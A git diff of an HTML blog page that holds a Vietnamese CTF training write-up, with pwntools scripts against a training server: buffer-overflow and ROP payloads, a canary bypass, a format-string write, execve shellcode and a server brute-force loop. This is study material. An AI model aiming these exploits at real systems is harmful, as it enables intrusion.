@@ -14,7 +14,7 @@
   <link rel="alternate" type="application/rss+xml" title="Duc Dat Dau" href="http://localhost:4000/feed.xml">
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>BKCTF Training 2024 (Vietnamese) | Duc Dat Dau</title>
-<meta name="generator" content="Jekyll v4.3.2" />
+<meta name="generator" content="Jekyll v3.10.0" />
 <meta property="og:title" content="BKCTF Training 2024 (Vietnamese)" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Table of Content pwn/Buffalow pwn/index_1 pwn/int_1 pwn/Rộp Rộp Rộp pwn/pwn3 pwn/Raising the hero pwn/shell_1 crypto/B64 Recovery reverse/Baby IDA 1 reverse/BabyRust reverse/babylua" />
@@ -302,16 +302,16 @@
 <p><img src="/images/bktrain2024/image.png" alt="alt text"></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_1</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6001</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bof_1"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6001</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mi">76</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x13141516</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mi">76</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x13141516</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p><img class="emoji" title=":triangular_flag_on_post:" alt=":triangular_flag_on_post:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f6a9.png" height="20" width="20"> <strong>BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}</strong></p>
@@ -406,14 +406,14 @@
 <p><img src="/images/bktrain2024/image-7.png" alt="alt text"></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6051</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6051</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2147483647</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">10</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2147483647'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'10'</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}
 </span></code></pre></div></div>
 <h2 id="pwnrộp-rộp-rộp">
@@ -478,20 +478,20 @@
 <p><img src="/images/bktrain2024/image-4.png" alt="alt text"></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_2</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bof_2"</span><span class="p">)</span>
 <span class="c1"># p = process(elf.path) 
-</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6011</span><span class="p">)</span>
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6011</span><span class="p">)</span>
 
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004011e5</span>
 <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x00000000004011ee</span>
 <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"win"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{2--&gt;\\xupgrade\\xBuffer\\xOv3rfl0w\\x1s\\xn0t\\xchiLL\\xhixxxxxxxxxxxxxx}
 </span></code></pre></div></div>
 <h2 id="pwnpwn3">
@@ -522,24 +522,24 @@
 <p>Về cơ bản, ý tưởng giải bài này y hệt bài phía trên. Chỉ khác ở bài này có thêm cờ canary được bật.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./bof_3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./bof_3"</span><span class="p">)</span>
 <span class="c1"># p = process("./bof_3")
-</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6021</span><span class="p">)</span>
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6021</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">is: </span><span class="sh">'</span><span class="p">)</span>
-<span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">strip</span><span class="p">().</span><span class="nf">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
-<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">canary</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'is: '</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"canary"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
 
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000401205</span>
 <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x000000000040120e</span>
 <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0000000000401398</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x58</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">"</span><span class="s">win</span><span class="sh">"</span><span class="p">])</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">number: </span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'x'</span><span class="o">*</span><span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"win"</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'number: '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{W3_4LL_Hat3_c4NARY}
 </span></code></pre></div></div>
 <h2 id="pwnraising-the-hero">
@@ -593,23 +593,23 @@
 <p>Đây là dạng bài <code class="language-plaintext highlighter-rouge">ret2win</code>, chúng ta chỉ cần thay đổi giá trị <code class="language-plaintext highlighter-rouge">target = 0x6F726568</code> sẽ có được shell.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./fmt_1</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6101</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./fmt_1"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6101</span><span class="p">)</span>
 
 <span class="n">target</span> <span class="o">=</span> <span class="mh">0x0804B39C</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6568</span><span class="si">}</span><span class="s">c%23$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="mh">0x6F72</span> <span class="o">-</span> <span class="mh">0x6568</span><span class="si">}</span><span class="s">c%24$n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="mh">0x6568</span><span class="si">}</span><span class="s">c%23$n'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="mh">0x6F72</span> <span class="o">-</span> <span class="mh">0x6568</span><span class="si">}</span><span class="s">c%24$n'</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s">'P'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">say?</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'say?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{R41s1ng_th3_H3rO}
 </span></code></pre></div></div>
 
@@ -657,15 +657,15 @@
 <p><img src="/images/bktrain2024/image-6.png" alt="alt text"></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./shell_1</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">6071</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./shell_1"</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">6071</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="sh">'</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">(max 256 bytes):</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05</span><span class="s">'</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'(max 256 bytes):</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{ju$7_A_5imPLE_ShelLCODE}
 </span></code></pre></div></div>
 <h2 id="cryptob64-recovery">
@@ -705,20 +705,20 @@
 
 <p>Đề bài cho chúng ta source code như sau</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
-<span class="kn">import</span> <span class="n">random</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">BKSEC{still secret}</span><span class="sh">'</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
-<span class="n">key</span> <span class="o">=</span> <span class="sh">""</span> <span class="c1">#guess it if u can
-</span><span class="n">encode</span> <span class="o">=</span> <span class="sh">""</span>
-<span class="n">pivot</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s">'BKSEC{still secret}'</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">""</span> <span class="c1">#guess it if u can
+</span><span class="n">encode</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">pivot</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 <span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
-    <span class="n">encode</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+    <span class="n">encode</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
     <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
-    <span class="n">i</span> <span class="o">%=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
-<span class="n">output</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">pivot</span><span class="p">)</span> <span class="o">+</span> <span class="n">encode</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">%=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="n">output</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">pivot</span><span class="p">)</span> <span class="o">+</span> <span class="n">encode</span>
+<span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>Từ <code class="language-plaintext highlighter-rouge">output</code>, chúng ta có thể biết một số thông tin như sau</p>
@@ -736,19 +736,19 @@
 <p>Nhờ việc connect server liên tục, ta có thể đoán được <code class="language-plaintext highlighter-rouge">len(key) = 50</code></p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># brute-force to find len of key
 </span><span class="n">x</span> <span class="o">=</span> <span class="p">[]</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
 
     <span class="n">lenflag</span> <span class="o">=</span> <span class="mi">68</span> 
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">x</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="n">x</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
 
-    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">pivot </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"pivot "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pivot</span><span class="p">))</span>
 
-<span class="n">x</span><span class="p">.</span><span class="nf">sort</span><span class="p">()</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">x</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>Kế tiếp, ta đã biết được <strong>flag gốc</strong> bắt đầu bằng cụm từ <strong>BKSEC{</strong>. Thử một số phép thử với mã hóa base64, ta nhận thấy flag sau khi encode luôn bắt đầu bằng <strong>QktTRUN7</strong>.</p>
@@ -756,80 +756,80 @@
 <p>Do ta đã biết đoạn <code class="language-plaintext highlighter-rouge">encoded</code>, kết hợp thuật toán nêu trên. Ta có thể tìm lại được <code class="language-plaintext highlighter-rouge">key</code> bằng cách cho connet server liên tục để khôi phục.</p>
 
